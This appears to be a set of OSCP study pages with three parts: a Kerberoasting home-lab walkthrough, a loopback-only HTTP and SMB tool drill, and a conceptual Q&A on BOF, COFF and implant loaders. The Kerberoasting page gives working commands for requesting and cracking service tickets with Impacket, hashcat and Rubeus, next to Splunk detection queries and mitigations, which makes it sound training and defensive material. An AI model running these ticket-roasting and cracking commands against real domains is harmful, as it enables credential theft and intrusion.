docs.title: Lab Walkthroughs
docs.text:
Full worked examples run in my home lab (lab.local) — the attack executed end to end, then detected from the defender side (Splunk / Zeek). They turn the study-map pages into hands-on practice, and double as blue-team detection content.

Lab, not the exam

These use my own lab targets and deliberately weak accounts so the technique is easy to reproduce and to detect. The exam itself is manual and unassisted — see Methodology and Exam format.

  • Kerberoasting

    Principle → vulnerable SPN account → roast & crack from Kali → detect via Windows event 4769 in Splunk.

    Kerberoasting

Start with reproducible HTTP and SMB tool practice for local fundamentals without a domain. It includes raw execution logs and image provenance.

docs.title: Lab: Kerberoasting
docs.text:
Lab: lab.local · DC01 10.10.10.20 · Win10 10.10.10.30 · Splunk on core 10.10.10.10 · Last updated: 2026-10-23

In one sentence

A full Kerberoasting walkthrough in the home lab — the principle, setting up a vulnerable SPN account, roasting and cracking from Kali, and detecting it in Splunk via Windows event 4769.

Study side vs. detection side

This is the hands-on version. The mechanism and detection reference lives at Adversary › Kerberoasting; the exam-strategy view is on Active Directory.

docs.title: 1. Why it works
docs.text:
When a user wants to reach a service (MSSQL, a web app…), they ask the domain controller (KDC) for a service ticket (TGS) for that service. The key fact:

Part of the TGS the KDC hands out is encrypted with the password hash of the service account that runs the service.

Kerberos does not check, at ticket-issuing time, whether you are actually allowed to use that service — that check happens later, at the service. So any domain user can request a TGS for any account that has an SPN (Service Principal Name).

The attack, in four steps:

flowchart LR
    A[Any domain user] -->|1. find SPN accounts| B[LDAP query to DC]
    B -->|2. request TGS| C[DC / KDC]
    C -->|3. TGS encrypted with<br/>service account hash| A
    A -->|4. crack offline| D[hashcat]

No connection to the target service, no failed logon — just ordinary-looking Kerberos requests. It works because service accounts often have weak passwords that rarely change.

It is not spoofing, so unlike Responder poisoning it is allowed on the OSCP exam (exam rules).

docs.title: 2. Lab setup (once, on DC01)
docs.text:
You need a service account with an SPN and a weak password, plus a normal user to attack as. On DC01, as admin, in PowerShell:

# 1) Vulnerable service account — SPN set, deliberately weak password
New-ADUser -Name "svc_mssql" -SamAccountName svc_mssql `
  -UserPrincipalName svc_mssql@lab.local `
  -AccountPassword (ConvertTo-SecureString "Password1" -AsPlainText -Force) `
  -Enabled $true -PasswordNeverExpires $true
setspn -S MSSQLSvc/db01.lab.local:1433 svc_mssql

# 2) A normal domain user to attack as
New-ADUser -Name "j.doe" -SamAccountName j.doe `
  -AccountPassword (ConvertTo-SecureString "Welcome1!" -AsPlainText -Force) `
  -Enabled $true

setspn -S MSSQLSvc/db01.lab.local:1433 svc_mssql registers an SPN on svc_mssql — an account is only Kerberoastable once it has an SPN. The password Password1 is in rockyou.txt, so the crack finishes in seconds; once the flow is familiar, change it to something not in rockyou (e.g. Autumn2026!) to feel a password that won't crack.

docs.title: 3. Run the attack (from Kali)
docs.text:
Linux tooling (Impacket), to match the exam. Run it from a Kali VM or the host laptop (10.10.10.1). Kerberos needs names, so fix resolution first:

export DC=10.10.10.20
export DOMAIN=lab.local
echo "$DC dc01.lab.local dc01 lab.local" | sudo tee -a /etc/hosts

docs.title: 3.1 Find SPN accounts
docs.text:
impacket-GetUserSPNs lab.local/j.doe:'Welcome1!' -dc-ip $DC

impacket-GetUserSPNs asks the domain over LDAP for accounts that have an SPN. The argument is domain/user:password; -dc-ip says which DC to ask.

Example output
ServicePrincipalName           Name       MemberOf  PasswordLastSet      LastLogon
-----------------------------  ---------  --------  -------------------  ---------
MSSQLSvc/db01.lab.local:1433   svc_mssql            2026-10-23 09:12:01  <never>

No ticket requested yet — this only confirms the target exists.

docs.title: 3.2 Request tickets
docs.text:
impacket-GetUserSPNs lab.local/j.doe:'Welcome1!' -dc-ip $DC -request -outputfile kerberoast.txt

-request actually asks for the TGS of each SPN account and saves a crackable form to the file:

kerberoast.txt (one line, truncated)
$krb5tgs$23$*svc_mssql$LAB.LOCAL$MSSQLSvc/db01.lab.local:1433*$a1b2...<long hex>...9f0e

$krb5tgs$23$ matters: krb5tgs = a Kerberos TGS hash, and 23 = encryption type RC4 (etype 23 / 0x17). RC4 cracks fast — good for the attacker, and a detection signal for the defender (§4). An AES ticket would show $krb5tgs$18$ and be far slower.

docs.title: 3.3 Crack offline
docs.text:
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

-m 13100 tells hashcat this is a Kerberoast (RC4 TGS) hash — the wrong mode won't crack. On success the password is appended:

$krb5tgs$23$*svc_mssql$LAB.LOCAL$...<snip>...:Password1
                                              ^^^^^^^^^  cracked password

Now feed svc_mssql:Password1 into the "try it everywhere" step → Active Directory › looting. Service accounts are often privileged, so this frequently unlocks the next host.

docs.title: (alt) From Windows with Rubeus
docs.text:
If you have a domain user session on Win10:

.\Rubeus.exe kerberoast /nowrap

/nowrap keeps each hash on one line so it pastes cleanly into hashcat.

docs.title: 4. Detect it in Splunk
docs.text:
Kerberoasting leaves event 4769 on the DC.

Event code 4769 — "A Kerberos service ticket was requested" is written to the DC's Security log whenever anyone requests a TGS. It fires thousands of times a day in normal use (every time a user reaches a file server, mail, etc.), so you don't look for "a 4769" — you look for a suspicious-shaped 4769:

Field Suspicious value Why Ticket_Encryption_Type 0x17 (RC4) Modern Windows defaults to AES (0x12). An RC4 request is the attack tool choosing weak crypto Service_Name one account requesting many in a short window A normal user asks for one or two services; a single account sweeping SPNs is roasting

docs.title: 4.0 Enable the audit first
docs.text:
Your lab's audit policy doesn't yet include Kerberos service-ticket operations, so 4769 isn't being written. On DC01:

auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable

The event lands in DC01's Security log, so DC01's Universal Forwarder must ship the Security channel to Splunk. Note the trace is on the DC, not on the host you attacked from.

docs.title: 4.1 The SPL, one line at a time
docs.text:
SPL chains commands with the pipe |: narrow the data on the left, reshape it at each |. Start by confirming the data arrives:

index=wineventlog source="WinEventLog:Security" EventCode=4769

index=wineventlog is where the Windows logs go (index named explicitly — no index=*). source="WinEventLog:Security" keeps only the Security channel. EventCode=4769 keeps only service-ticket requests. Listed without pipes, these are all AND conditions.

Now keep only RC4:

index=wineventlog source="WinEventLog:Security" EventCode=4769 Ticket_Encryption_Type=0x17

Then drop computer accounts (their SPNs end in $) and krbtgt:

index=wineventlog source="WinEventLog:Security" EventCode=4769 Ticket_Encryption_Type=0x17
  Service_Name!="*$" Service_Name!="krbtgt"

!= is "not equal", * is a wildcard, so Service_Name!="*$" means "service name does not end in $".

Finally, group by requester to expose the sweep:

index=wineventlog source="WinEventLog:Security" EventCode=4769 Ticket_Encryption_Type=0x17 Service_Name!="*$"
| stats dc(Service_Name) as spn_count values(Service_Name) as services by Account_Name, Client_Address
| where spn_count > 3

stats aggregates: dc(Service_Name) is a distinct count of service names, saved as spn_count; values(Service_Name) collects the actual names into services; by Account_Name, Client_Address groups per requesting account and source IP. | where spn_count > 3 keeps only accounts that asked for 4+ distinct SPNs.

Example result
Account_Name   Client_Address   spn_count   services
------------   --------------   ---------   -----------------------------------------
j.doe          10.10.10.30      7           MSSQLSvc/db01... HTTP/web01... CIFS/fs01...

One account, from the box you attacked, asking for 7 distinct SPNs over RC4 — the classic Kerberoasting shape. Account_Name and Client_Address are your investigation starting points.

If a field isn't extracted

If Ticket_Encryption_Type isn't a field in your instance, pull it from the raw text: | rex field=Message "Ticket Encryption Type:\s+(?<enc>0x[0-9a-fA-F]+)" then | search enc=0x17. rex extracts a regex capture group into a new field enc.

docs.title: 4.2 Reproduce with Atomic Red Team
docs.text:
Kerberoasting is T1558.003. On Win10:

Invoke-AtomicTest T1558.003 -ShowDetails
Invoke-AtomicTest T1558.003

Run it, then confirm the 4769s appear with the query above — the attack→detect cycle your lab is built for.

docs.title: 5. Zeek (sensor stack)
docs.text: Once the Zeek sensor is up, Kerberos traffic is in kerberos.log with request_type (AS/TGS), service (the requested SPN), success, and encryption info. The network signal is the same — a burst of TGS requests from one source using weak encryption. Cross-checking host logs (4769) against network logs (kerberos.log) is the hunting standard. See Network.

docs.title: 6. Mitigation (report-ready)
docs.text:
• Move service accounts to gMSA (group managed service accounts) — long, auto-rotated passwords make cracking impractical.
  • If a normal account must be used, require a 25+ character password; Kerberoasting is an offline crack, so length defeats it.
  • Disable RC4 and allow AES only, so 0x17 tickets never appear.
  • Alert on RC4 4769 requests (the SPL above as a saved search).

docs.title: Tool Practice: HTTP and SMB
docs.text:
Updated / 최종 수정: 2026-11-05

What you will actually run

A loopback-only HTTP service and authenticated SMB share. Discover HTTP with Nmap, fuzz three paths with ffuf, read the response with curl, transfer a harmless text file with Impacket, and compare its SHA-256. No Windows VM or domain is required.

Prerequisites: a Linux/Kali VM; Python 3, Nmap, ffuf, curl, Impacket; two terminals. Use only 127.0.0.1. Ports 18080 and 1445 must be free. The high SMB port avoids root; it is for Impacket clients, not native Windows UNC access.

sudo apt install nmap ffuf curl impacket-scripts python3-impacket
mkdir -p ~/oscp-tool-lab/{web/admin,share,downloads}
cd ~/oscp-tool-lab
printf 'Training home
' > web/index.html
printf 'Training admin page
' > web/admin/index.html
printf 'Training login page
' > web/login
printf 'admin
login
missing
' > words.txt
printf 'OSCP practice: controlled SMB transfer
' > share/note.txt

These pages contain no vulnerable application and no exam material. A discovered admin path demonstrates enumeration, not compromise.

docs.title: 1. HTTP discovery and false positives
docs.text:
Terminal A:

cd ~/oscp-tool-lab
python3 -m http.server 18080 --bind 127.0.0.1 --directory web

Terminal B:

cd ~/oscp-tool-lab
nmap --unprivileged -sT -Pn -n -p 18080,18081 -sV 127.0.0.1
curl -i http://127.0.0.1:18080/
curl -i http://127.0.0.1:18080/missing
ffuf -u http://127.0.0.1:18080/FUZZ -w words.txt -mc all   -t 1 -rate 5 -noninteractive -of json -o paths.json
curl -i http://127.0.0.1:18080/admin/

Read the result: 18080 should be open; 18081 should be closed if unused. admin redirects to /admin/, login responds 200, missing responds 404. If the service name differs, trust the actual banner and port response rather than memorising the label. A 301 is a navigation hint. Use curl -L only after recording where it redirects.

Failure drill: stop Terminal A and repeat one curl command. Explain the difference between connection refused and HTTP 404. Restart the server before continuing.

docs.title: 2. Authenticated SMB transfer
docs.text:
Terminal A (leave it running):

cd ~/oscp-tool-lab
impacket-smbserver LAB "$PWD/share" -smb2support -ip 127.0.0.1 -port 1445   -username learner -password 'LabOnly-123!'

Terminal B:

cd ~/oscp-tool-lab/downloads
# Impacket 0.13.1 CLI restricts -port to 139/445; use its API mini-shell here:
python3 -c 'from impacket.smbconnection import SMBConnection; from impacket.examples.smbclient import MiniImpacketShell; s=SMBConnection("127.0.0.1","127.0.0.1",sess_port=1445); s.login("learner","LabOnly-123!","LAB"); MiniImpacketShell(s,None).cmdloop()'

At the SMB # prompt:

shares
use LAB
ls
get note.txt
exit

Back in the local shell:

cd ~/oscp-tool-lab
sha256sum share/note.txt downloads/note.txt
cmp share/note.txt downloads/note.txt && echo 'MATCH: same file bytes'

The two hashes must match; cmp exits 0 on identical bytes. You authenticated and read a permitted share, not obtained a Windows shell or domain admin. shares and use LAB happen in the SMB mini-shell; sha256sum happens in Bash.

Failure drills: (1) use the wrong password once and observe authentication failure; (2) use a nonexistent share and distinguish that from login failure; (3) change port 1445 to an unused high port and distinguish connection failure. No password loop is needed. Stop your servers with Ctrl-C after the exercise.

docs.title: 3. Add a Windows/AD lab next
docs.text:
The loopback lab cannot validate LDAP, Kerberos, WMI, SCM, Windows tokens or replication. On your own isolated Windows domain or an authorised training range, provision a normal domain user, one member server, a DC and deliberately scoped test rights. Follow the Impacket handbook and write down these observations:

Drill Success evidence Expected denied case Share read Listing/download + matching file hash Non-readable admin share SPN / AS-REP Account mapping and correctly identified hash format Account not eligible for AS-REP MSSQL SQL identity, role membership and actual execution context Login valid elsewhere but SQL permission absent WMI / SCM Verified identity in the target shell Standard user cannot create an admin service Offline SAM Correct hive pair parsed into typed fields Wrong/missing SYSTEM hive DCSync Only with deliberately granted replication rights Member-host local admin is insufficient Kerberos cache Correct realm, hostname and selected cache Wrong service hostname or expired cache

Do not expect every technique on every OSCP set. Lab success is about understanding prerequisites and alternatives.

docs.title: 4. Capture provenance and limitations
docs.text:
The repository's scripts/oscp-captures/capture.py runs the local demonstrations and captures the upstream Impacket help output. render.py renders the exact captured text into PNGs without editing the output; the on-image title distinguishes help from an executed service interaction. Raw .txt logs and manifest.json record commands, versions, SHA-256 and capture time. The images are terminal-output renderings, not remote desktop/GUI screenshots. AD success screens are deliberately not invented.

Reproduce all repository captures from a Linux workspace:

python3 -m venv /tmp/oscp-captures-venv
/tmp/oscp-captures-venv/bin/pip install -r scripts/oscp-captures/requirements.txt
PATH="/tmp/oscp-captures-venv/bin:$PATH" python3 scripts/oscp-captures/capture.py
/tmp/oscp-captures-venv/bin/python scripts/oscp-captures/render.py

Install Nmap, ffuf and curl with your distribution first. These scripts use temporary loopback services, create only a temporary work directory, terminate their own children and write capture files under the repository. They do not contact a domain or scan a network. Port conflicts fail clearly instead of killing unrelated processes.

docs.title: Completion record
docs.text:
Record the command, expected result, observed result, failure explanation and next action for each drill. Keep a target screenshot showing identity and IP in your Windows/AD mock report; the loopback file-transfer image is not a substitute for exam proof.

Back to practical guide · Impacket handbook · Reporting

docs.title: Questions — BOF, COFF, Loaders, and OBJ Files
Questions — BOF, COFF, Loaders, and OBJ Files
docs.text: Supplement to Lesson 13: This page preserves the follow-up questions, detailed explanations, simpler analogy, and corrected build-to-execution sequence. Examples refer to typical Windows BOFs; exact loader support varies.

docs.title: Can BOF and COFF be explained in more detail?
docs.text:
They describe different aspects of a file:

Term Full name Describes BOF Beacon Object File Task code written for a supported agent execution convention COFF Common Object File Format The structure containing object code and related information COFF loader Loader implementation Software that reads such a file and prepares its code to run

Both statements can be true: “This is a BOF that queries account information” and “This BOF is packaged as a COFF object file.” The format and the task convention are not rival execution methods.

A BOF needs conventions for its entry function, arguments, output, and supported external functions. Arbitrarily compiling a C program to an object file does not guarantee a compatible BOF. The term originated with Cobalt Strike's Beacon; compatible execution environments can support the same model. BOF description from the originating project

docs.title: What is inside a COFF object?
docs.text:
Component Plain explanation Header Basic information such as target machine type Sections Regions containing code or data Symbol information Names and references for functions and data Relocation information Information needed to adjust references when code/data are placed

At compilation, the final memory location of a string or function may not yet be known. Preparation must connect references to their eventual locations. COFF is a general development format, not an inherently offensive format. Windows PE executable images and COFF object files are related but distinct; a COFF object is not simply an ordinary ready-to-launch EXE. Microsoft PE/COFF specification

An illustrative loader sequence is to read structure, arrange code/data in memory, resolve supported references and address adjustments, then call the agreed entry function. COFFLoader is one implementation, not the name of the file format itself. COFFLoader project

docs.title: Can this be explained more simply?
docs.text:
Think of a report and DOCX:

  • Report describes the document's purpose and content.
  • DOCX describes how a document is stored.

Similarly, BOF describes the task program and its execution convention; COFF describes its object-file structure. The analogy explains this relationship, not the technical equivalence of documents and executable code.

Term Simplest working explanation BOF Small additional task program COFF Object-file format used to contain that code Loader Functionality that prepares the object code for execution

For a user-name query:

Task: Find the current account name
    -> BOF: Small program implementing that task
    -> COFF: Object-file structure containing its code

Existing implant
    -> Loader prepares the BOF
    -> BOF queries the account
    -> Illustrative result: LAB\student

Thus, “account-query BOF” describes the program, while “COFF format” describes how its object code is organized.

docs.title: Is an OBJ file an object file?
docs.text:
Yes. .obj is a common object-file extension. An object file is an intermediate compilation result. It can already contain machine code, data, and information needed for connection with other code, while ordinary executable preparation remains to be done.

hello.c          hello.obj          hello.exe
Source code  ->  Object file    ->  Executable
             Compile           Link
Stage Meaning Source code Instructions written by a programmer Compile Translate source into object code for a target Object file Resulting code/data with linking information Link Combine and connect needed code and references Executable Image prepared for normal operating-system loading

For example, source may call an output function. The object can describe that reference while the work needed to connect it remains. An object is not uncompiled source, and it is not normally launched like a finished EXE.

BOFs use object code following their own runtime conventions. Compare the simplified paths:

Ordinary program:
Source -> Object file -> Link -> Launch EXE

BOF:
Source -> BOF-compatible object -> Loader prepares it -> Run inside implant
Label What it tells you .obj A commonly used filename extension COFF Internal object-file structure BOF Supported agent task-program convention

Not every .obj is a BOF. Objects can also use .o; an extension alone does not establish internal format or BOF compatibility. Renaming a file does not change its structure or execution convention.

docs.title: Is it built for the implant environment, then prepared by a loader?
docs.text:
Learner question: “So a BOF object is generated for the environment where the implant runs, and then the loader prepares and executes it?”

Yes, with one wording correction: the compiler produces the object from BOF source; a BOF does not itself generate the object merely by being a BOF.

1. Development / build environment
   BOF source code
       -> Compile for compatible target
       -> BOF object file, such as Windows/x64 COFF

2. Target computer
   Running implant receives task code
       -> Loader prepares memory and required references
       -> BOF entry function runs
       -> Result returns

“Compatible target” includes the OS, implant-process architecture, supported execution convention, and dependencies. A 64-bit OS does not automatically mean every process on it is 64-bit. Packages can supply precompiled objects through Armory, so the operator need not personally compile each use.

The BOF and loader do not automatically acquire a new identity or administrator token. Resource access still depends on the effective process/thread context and permissions. A successful user query establishes that query in its execution context, not unrestricted access elsewhere.

docs.title: Compare ordinary EXE and usual BOF execution
docs.text:
Point Ordinary EXE launch Usual BOF execution Prepared artifact Finished PE executable Compatible object code Preparation Operating-system loading and runtime support as needed BOF loader/executor Process placement Usually a new program process Usually the existing implant process Result handling Program's chosen output mechanism Supported BOF output mechanism Automatically elevated? No No

A BOF can itself create processes, read/write files, or communicate if its task does so. The usual in-process loading mechanism does not make all later behavior invisible. The same distinction is developed in Lesson 14.

Previous: Armory and BOF basics · Next: EXE, .NET, and BOF execution

docs.title: How Lesson 17 will begin
docs.text:
Use one fictional service and answer four questions in order:

  1. Under which account is the service configured to run?
  2. Can the current context query or change its configuration?
  3. Can the current context modify the executable or relevant directory?
  4. Can the current context start or stop the service?

Read one short output at a time, then compare two users with different permissions. This develops the three permission categories introduced in Lesson 16.
